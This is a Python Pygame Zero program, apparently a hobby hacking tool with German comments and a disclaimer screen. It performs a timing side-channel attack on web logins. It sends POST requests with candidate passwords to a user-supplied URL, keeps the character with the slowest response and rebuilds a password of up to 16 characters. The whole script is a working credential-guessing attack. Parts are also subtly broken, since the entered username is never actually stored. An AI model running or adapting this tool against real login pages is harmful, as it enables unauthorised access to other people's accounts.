import os
os.environ['SDL_VIDEO_WINDOW_POS'] = '100,100'

import pgzrun
import pygame
import time
import requests
import string
from pgzero.keyboard import keys

# Musik
pygame.mixer.init()
pygame.mixer.music.load("song.mp3")
pygame.mixer.music.play(-1)

# Konfiguration
URL = "http://localhost/"
USERNAME = "user"
charset = string.ascii_letters + string.digits + string.punctuation
known = ""
level = 0
input_text = URL
act = 1
field_name = "username"
current_index = 0
timings = []

# Fenstergröße
WIDTH = 800
HEIGHT = 600

def measure_time(guess):
    try:
        start = time.perf_counter()
        requests.post(URL, data={field_name: USERNAME, "password": guess})
        return time.perf_counter() - start
    except Exception as e:
        print("Fehler bei Anfrage:", e)
        return 0

def draw():
    screen.clear()
    try:
        screen.blit("back", (0, 0))
    except:
        screen.fill((30, 30, 30))  # Fallback-Hintergrund

    if level == 0:
        try:
            screen.blit("disclaimer", (0, 0))
            screen.blit("okbtn", (700, 500))
        except:
            screen.draw.text("Disclaimer fehlt", (100, 100), color="white")
    elif level == 1:
        screen.draw.text("This tool needs a very constant web connection!", fontsize=28, center=(300, 190), color="white")
        screen.draw.filled_rect(Rect(100, 250, 600, 50), (50, 50, 50))
        screen.draw.rect(Rect(100, 250, 600, 50), (255, 255, 255))
        screen.draw.text(input_text, (110, 265), color="white", fontsize=30)
        screen.draw.text("|", (110 + len(input_text) * 15, 265), color="white", fontsize=30)
    elif level == 2:
        screen.draw.text(f"Known so far: {known}", (110, 265), color="white", fontsize=30)
        if len(known) >= 16:
            screen.draw.text(f"Password of {field_name} is: {known}", (110, 300), color="white", fontsize=30)

def update():
    global current_index, known, timings

    if level == 2 and len(known) < 16:
        if current_index < len(charset):
            c = charset[current_index]
            attempt = known + c
            t = measure_time(attempt)
            timings.append((t, c))
            print(f"Trying {attempt:<20} → {t:.6f}s")
            current_index += 1
        else:
            timings.sort(reverse=True)
            best_char = timings[0][1]
            known += best_char
            print(f"\n🔐 Best guess so far: {known}\n")
            current_index = 0
            timings.clear()

def on_key_down(key, unicode):
    global input_text, act, URL, level, field_name
    if key == keys.BACKSPACE:
        input_text = input_text[:-1]
    elif key == keys.RETURN:
        if act == 1:
            URL = input_text
            input_text = "username"
        elif act == 2:
            USERNAME = input_text
            level = 2
        act += 1
    elif unicode:
        input_text += unicode

def on_mouse_down(pos):
    global level
    if Rect(700, 500, 64, 64).collidepoint(pos):
        if level == 0:
            level = 1

pgzrun.go()
